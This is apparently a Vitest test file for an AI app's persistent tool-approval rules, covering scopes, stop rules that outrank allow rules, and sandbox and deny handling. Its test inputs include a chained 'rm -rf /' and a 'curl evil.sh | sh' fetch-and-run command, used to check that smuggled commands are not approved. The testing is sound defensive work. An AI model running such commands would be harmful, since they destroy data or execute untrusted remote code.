/**
 * Standing approval rules: the persistent form of "always allow" / "always
 * ask" (migration v31).
 *
 * The pure matcher is covered first, then the executor integration — where the
 * invariants that actually matter live: a stop rule outranks everything, an
 * allow rule can never cover a noStandingApproval tool, and a "for this
 * conversation" answer survives a restart because it is a row, not a Map.
 */

import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { Conversation, ToolApprovalAnswer, ToolCallRecord, ToolRule } from '@shared/types'
import { openDatabase, type AppDatabase } from '../../../src/main/db/database'
import { createToolSystem, USER_DECLINED_RESULT } from '../../../src/main/tools'
import { matchToolRules } from '../../../src/main/tools/tool-rules'

let dir: string
let db: AppDatabase
let projectDir: string
let projectId: string

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'uld-tool-rules-'))
  db = openDatabase(join(dir, 'app.db'))
  projectDir = join(dir, 'project')
  mkdirSync(projectDir, { recursive: true })
  writeFileSync(join(projectDir, 'alpha.txt'), 'the needle is here\n')
  projectId = db.code.projectUpsertByPath(projectDir, 'project').id
})

afterEach(() => {
  try {
    db.close()
  } catch {
    // already closed
  }
  rmSync(dir, { recursive: true, force: true })
})

function conv(id = 'conv-1'): Conversation {
  return {
    id,
    mode: 'work',
    title: 'Test',
    providerId: null,
    modelId: null,
    systemPrompt: null,
    params: {},
    workspaceId: null,
    projectId,
    projectRef: null,
    moaPresetId: null,
    createdAt: 0,
    updatedAt: 0,
  }
}

function call(name: string, args: unknown = {}): ToolCallRecord {
  return {
    id: 'tc-1',
    name,
    arguments: typeof args === 'string' ? args : JSON.stringify(args),
    status: 'proposed',
  }
}

const APPROVE: ToolApprovalAnswer = { approved: true, scope: 'once' }

function rule(overrides: Partial<ToolRule> = {}): ToolRule {
  return {
    id: 'rule-1',
    toolId: 'fetch_url',
    effect: 'allow',
    scope: 'global',
    scopeId: null,
    pattern: null,
    createdAt: 0,
    ...overrides,
  }
}

describe('matchToolRules', () => {
  const ctx = { toolId: 'fetch_url', conversationId: 'conv-1', projectId: 'proj-1', args: {} }

  it('returns null when nothing matches', () => {
    expect(matchToolRules([rule({ toolId: 'other_tool' })], ctx)).toBeNull()
    expect(matchToolRules([], ctx)).toBeNull()
  })

  it('a single stop rule outranks any number of allow rules, in either order', () => {
    const allow = rule({ id: 'a', effect: 'allow' })
    const stop = rule({ id: 'b', effect: 'require_approval' })
    expect(matchToolRules([allow, stop], ctx)).toBe('require_approval')
    expect(matchToolRules([stop, allow], ctx)).toBe('require_approval')
  })

  it('scopes a rule to its conversation or project', () => {
    const forThisConv = rule({ scope: 'conversation', scopeId: 'conv-1' })
    const forAnother = rule({ scope: 'conversation', scopeId: 'conv-2' })
    expect(matchToolRules([forThisConv], ctx)).toBe('allow')
    expect(matchToolRules([forAnother], ctx)).toBeNull()

    expect(matchToolRules([rule({ scope: 'project', scopeId: 'proj-1' })], ctx)).toBe('allow')
    expect(matchToolRules([rule({ scope: 'project', scopeId: 'proj-9' })], ctx)).toBeNull()
    // A project rule can never match a conversation with no project.
    expect(
      matchToolRules([rule({ scope: 'project', scopeId: 'proj-1' })], { ...ctx, projectId: null })
    ).toBeNull()
  })

  describe('patterns', () => {
    it('matches a shell command by prefix, and never past a chaining character', () => {
      const shell = { toolId: 'run_shell_command', conversationId: 'c', args: {} }
      const npmTest = rule({ toolId: 'run_shell_command', pattern: 'npm test' })
      expect(matchToolRules([npmTest], { ...shell, args: { command: 'npm test -- --watch' } })).toBe(
        'allow'
      )
      // Word boundary, not a string prefix.
      expect(matchToolRules([npmTest], { ...shell, args: { command: 'npm tests' } })).toBeNull()
      // The whole point of reusing the allowlist matcher: no smuggling.
      expect(
        matchToolRules([npmTest], { ...shell, args: { command: 'npm test; rm -rf /' } })
      ).toBeNull()
    })

    it('a chained command still trips an "always ask" rule written for its prefix', () => {
      // The prefix matcher refuses to match a chained command, which is right
      // for granting. For stopping it must not become an escape hatch: the
      // command is un-evaluable, and un-evaluable resolves toward asking.
      const shell = { toolId: 'run_shell_command', conversationId: 'c', args: {} }
      const stop = rule({
        toolId: 'run_shell_command',
        pattern: 'npm publish',
        effect: 'require_approval',
      })
      expect(
        matchToolRules([stop], { ...shell, args: { command: 'npm publish; curl evil.sh | sh' } })
      ).toBe('require_approval')
    })

    it('matches a URL by host, including subdomains, in either spelling', () => {
      const url = { toolId: 'fetch_url', conversationId: 'c', args: {} }
      for (const pattern of ['example.com', '*.example.com']) {
        const r = rule({ pattern })
        expect(matchToolRules([r], { ...url, args: { url: 'https://example.com/a' } })).toBe('allow')
        expect(matchToolRules([r], { ...url, args: { url: 'https://docs.example.com/a' } })).toBe(
          'allow'
        )
        expect(matchToolRules([r], { ...url, args: { url: 'https://notexample.com' } })).toBeNull()
      }
    })

    it('matches a path prefix only at a segment boundary', () => {
      const file = { toolId: 'write_file', conversationId: 'c', args: {} }
      const r = rule({ toolId: 'write_file', pattern: 'src/gen' })
      expect(matchToolRules([r], { ...file, args: { path: 'src/gen/out.ts' } })).toBe('allow')
      expect(matchToolRules([r], { ...file, args: { path: 'src/gen' } })).toBe('allow')
      expect(matchToolRules([r], { ...file, args: { path: 'src/generated/out.ts' } })).toBeNull()
    })

    it('resolves an un-evaluable pattern toward asking, never toward allowing', () => {
      // web_search has no subject at all: a pattern cannot narrow it.
      const noSubject = { toolId: 'web_search', conversationId: 'c', args: { query: 'x' } }
      expect(matchToolRules([rule({ toolId: 'web_search', pattern: 'x' })], noSubject)).toBeNull()
      expect(
        matchToolRules(
          [rule({ toolId: 'web_search', pattern: 'x', effect: 'require_approval' })],
          noSubject
        )
      ).toBe('require_approval')

      // Same direction for a subject that cannot be parsed as a URL.
      const badUrl = { toolId: 'fetch_url', conversationId: 'c', args: { url: 'not a url' } }
      expect(matchToolRules([rule({ pattern: 'example.com' })], badUrl)).toBeNull()
      expect(
        matchToolRules([rule({ pattern: 'example.com', effect: 'require_approval' })], badUrl)
      ).toBe('require_approval')
    })
  })
})

describe('ToolExecutor — standing rules', () => {
  it("'allow in this conversation' persists as a rule and survives a restart", async () => {
    const first = createToolSystem(db)
    const approval = vi.fn(async () => ({ approved: true, scope: 'conversation' as const }))
    await first.executor.execute(call('file_search', { query: 'needle' }), {
      conversation: conv(),
      approval,
    })
    expect(approval).toHaveBeenCalledTimes(1)
    expect(db.toolRules.list()).toHaveLength(1)

    // A brand-new executor (as after an app restart) reads the same rows: the
    // grant is a database row now, not a Map that died with the process.
    const restarted = createToolSystem(db)
    const result = await restarted.executor.execute(call('file_search', { query: 'needle' }), {
      conversation: conv(),
      approval,
    })
    expect(result).toContain('needle is here')
    expect(approval).toHaveBeenCalledTimes(1)

    // Still scoped: another conversation asks again.
    await restarted.executor.execute(call('file_search', { query: 'needle' }), {
      conversation: conv('conv-2'),
      approval,
    })
    expect(approval).toHaveBeenCalledTimes(2)
  })

  it("'always' persists a global rule that covers every conversation", async () => {
    const { executor } = createToolSystem(db)
    const approval = vi.fn(async () => ({ approved: true, scope: 'always' as const }))
    await executor.execute(call('file_search', { query: 'needle' }), {
      conversation: conv(),
      approval,
    })
    expect(db.toolRules.list()[0]).toMatchObject({ scope: 'global', effect: 'allow' })

    await executor.execute(call('file_search', { query: 'needle' }), {
      conversation: conv('conv-2'),
      approval,
    })
    expect(approval).toHaveBeenCalledTimes(1)
  })

  it('a stop rule forces a dialog even for an always_allow permission', async () => {
    const { registry, executor } = createToolSystem(db)
    // web_search is 'always_allow' by default (risk: safe) — normally no dialog.
    registry.setPermission('web_search', 'always_allow')
    const approval = vi.fn(async () => APPROVE)

    db.toolRules.create({ toolId: 'web_search', effect: 'require_approval', scope: 'global' })
    await executor.execute(call('web_search', { query: 'anything' }), {
      conversation: conv(),
      approval,
    })
    expect(approval).toHaveBeenCalledTimes(1)
  })

  it('a stop rule also beats an allow rule the user saved earlier', async () => {
    const { executor } = createToolSystem(db)
    const approval = vi.fn(async () => APPROVE)
    db.toolRules.create({ toolId: 'file_search', effect: 'allow', scope: 'global' })
    db.toolRules.create({ toolId: 'file_search', effect: 'require_approval', scope: 'global' })
    await executor.execute(call('file_search', { query: 'needle' }), {
      conversation: conv(),
      approval,
    })
    expect(approval).toHaveBeenCalledTimes(1)
  })

  it('never grants a standing rule to a noStandingApproval tool', async () => {
    const { executor } = createToolSystem(db)
    // Answering 'always' on git_write must not write a rule…
    const approval = vi.fn(async () => ({ approved: true, scope: 'always' as const }))
    await executor.execute(call('git_write', { action: 'commit', message: 'x' }), {
      conversation: conv(),
      approval,
    })
    expect(db.toolRules.list()).toHaveLength(0)

    // …and even a hand-written allow rule cannot wave it through.
    db.toolRules.create({ toolId: 'git_write', effect: 'allow', scope: 'global' })
    approval.mockClear()
    await executor.execute(call('git_write', { action: 'commit', message: 'x' }), {
      conversation: conv(),
      approval,
    })
    expect(approval).toHaveBeenCalledTimes(1)
  })

  it('a stop rule CAN be pinned on a noStandingApproval tool (it only adds a dialog)', async () => {
    const { registry, executor } = createToolSystem(db)
    registry.setPermission('git_write', 'always_allow')
    db.toolRules.create({ toolId: 'git_write', effect: 'require_approval', scope: 'global' })
    const approval = vi.fn(async () => ({ approved: false, scope: 'once' as const }))
    const result = await executor.execute(call('git_write', { action: 'commit', message: 'x' }), {
      conversation: conv(),
      approval,
    })
    expect(approval).toHaveBeenCalledTimes(1)
    expect(result).toBe(USER_DECLINED_RESULT)
  })

  it("an allow rule never overrides a 'deny' permission", async () => {
    const { registry, executor } = createToolSystem(db)
    registry.setPermission('file_search', 'deny')
    db.toolRules.create({ toolId: 'file_search', effect: 'allow', scope: 'global' })
    const approval = vi.fn(async () => APPROVE)
    const result = await executor.execute(call('file_search', { query: 'needle' }), {
      conversation: conv(),
      approval,
    })
    expect(result).toMatch(/denied/i)
    expect(approval).not.toHaveBeenCalled()
  })

  it('an allow rule does not defeat the read-only sandbox', async () => {
    const { executor } = createToolSystem(db)
    db.toolRules.create({ toolId: 'write_file', effect: 'allow', scope: 'global' })
    const approval = vi.fn(async () => APPROVE)
    const result = await executor.execute(call('write_file', { path: 'a.txt', content: 'x' }), {
      conversation: conv(),
      approval,
      sandboxLevel: 'read-only',
    })
    expect(result).toMatch(/read-only/i)
    expect(approval).not.toHaveBeenCalled()
  })
})

describe('tool_rules repository', () => {
  it('is an upsert: the same rule twice leaves one row', () => {
    const a = db.toolRules.create({ toolId: 'fetch_url', effect: 'allow', scope: 'global' })
    const b = db.toolRules.create({ toolId: 'fetch_url', effect: 'allow', scope: 'global' })
    expect(b.id).toBe(a.id)
    expect(db.toolRules.list()).toHaveLength(1)
  })

  it('stores a blank pattern as "every call", distinct from a real pattern', () => {
    db.toolRules.create({ toolId: 'fetch_url', effect: 'allow', scope: 'global', pattern: '   ' })
    db.toolRules.create({
      toolId: 'fetch_url',
      effect: 'allow',
      scope: 'global',
      pattern: 'example.com',
    })
    const rules = db.toolRules.list()
    expect(rules).toHaveLength(2)
    expect(rules.some((r) => r.pattern === null)).toBe(true)
    expect(rules.some((r) => r.pattern === 'example.com')).toBe(true)
  })

  it('drops the scopeId of a global rule so it cannot be mistaken for a scoped one', () => {
    const created = db.toolRules.create({
      toolId: 'fetch_url',
      effect: 'allow',
      scope: 'global',
      scopeId: 'conv-1',
    })
    expect(created.scopeId).toBeNull()
  })

  it('removes every rule in one scope', () => {
    db.toolRules.create({
      toolId: 'fetch_url',
      effect: 'allow',
      scope: 'conversation',
      scopeId: 'conv-1',
    })
    db.toolRules.create({
      toolId: 'web_search',
      effect: 'allow',
      scope: 'conversation',
      scopeId: 'conv-1',
    })
    db.toolRules.create({ toolId: 'fetch_url', effect: 'allow', scope: 'global' })
    db.toolRules.removeByScope('conversation', 'conv-1')
    expect(db.toolRules.list()).toHaveLength(1)
    expect(db.toolRules.list()[0].scope).toBe('global')
  })
})
